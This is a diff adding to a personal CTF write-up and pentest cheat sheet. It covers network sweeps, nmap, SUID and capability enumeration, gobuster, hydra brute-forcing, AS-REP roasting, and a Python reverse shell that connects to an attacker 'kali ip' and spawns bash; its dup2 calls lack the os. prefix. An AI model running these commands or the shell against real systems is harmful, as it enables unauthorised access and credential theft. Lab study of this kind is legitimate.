@@ -1,13 +1,32 @@
 # writeUp
 Just my write up for CTF
 
+
+# footprinting & scanning
+## Ping Sweeping
+```console
+$ fping –a –g 10.54.12.0/24 2> /dev/null 
+$ fping –a –g 10.54.12.010.54.12.255 2> /dev/null 
+```
+
+## Nmap
+```
+## -sn
+# nmap –sn 200.200.0.0/16
+# nmap –sn 200.200.123.1-12
+# nmap –sn 172.16.12.*
+# nmap –sn 200.200.12-13.* 
+## –iL <inputlist.txt>
+```
 # cheat sheet
 
+## wpscan
+https://www.cyberpunk.rs/wpscan-usage-example
 ## SUID
 use **suid3num.py**
 ```console
 $ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
-$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
+$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 $ find / -perm -u=s -type f 2>/dev/null
 $ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
@@ -24,7 +43,7 @@ powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
 ```
 ## gobuster
 ```console
-$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
+$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php,txt -t 54
 ```
 ## Password atk
 ### Hashcat
@@ -47,17 +66,39 @@ $ hydra -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/l
 $ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
 $ hydra -f -t 64 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
 $ hydra -t 64 -l username -P /usr/share/wordlists/rockyou.txt pop3://$IP #pop3
+$ hydra -L users.txt -P pass.txt telnet://target.server # telnet
 ```
 ## Reverse SSH port forwarding
 ```console
 $ ssh -L <LPORT>:<RHOST>:<RPROT> <username>@$IP
 ```
+## python revs shell
+```py
+import socket
+import pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("kali ip",9696))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+```
+
 
 ## TTY shell
 ```console
 $ python -c 'import pty; pty.spawn("/bin/sh")'
+$ python3 -c 'import pty; pty.spawn("/bin/sh")'
 $ echo os.system('/bin/bash')
 $ /bin/sh -i
+```
+# Linux capa
+```console
+$ getcap -r / 2>/dev/null
+```
+# cronjob
+```console
+$ for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
 ```
 ## msfconsole
 ### linux
@@ -140,6 +181,8 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
+
+
 
 ## etc
 ```console
